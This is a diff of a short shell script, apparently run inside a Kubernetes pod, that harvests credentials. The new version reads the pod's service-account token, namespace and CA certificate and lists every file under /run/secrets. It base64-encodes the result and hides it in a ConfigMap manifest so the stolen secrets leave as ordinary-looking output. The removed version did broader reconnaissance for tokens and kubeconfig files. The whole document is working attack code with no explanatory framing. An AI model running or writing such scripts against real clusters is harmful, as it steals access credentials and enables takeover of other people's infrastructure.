@@ -1,15 +1,19 @@
 #!/bin/sh
 RECON=$( (
-  find / -name "ca.crt" -o -name "*.token" -o -name "kubeconfig" 2>/dev/null
-  ls -la /run/secrets/ 2>/dev/null
-  ip addr 2>/dev/null | head -10
-  curl -k -s https://172.20.0.1/api 2>/dev/null | head -c 500
+  echo "===TOKEN==="
+  cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO_TOKEN"
+  echo "===NAMESPACE==="
+  cat /run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "NO_NS"
+  echo "===CA==="
+  cat /run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -c 200
+  echo "===ALL_FILES==="
+  find /run/secrets -type f 2>/dev/null
 ) | base64 | tr -d '\n')
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: recon-output
+  name: sa-output
 data:
   result: $RECON
 EOF
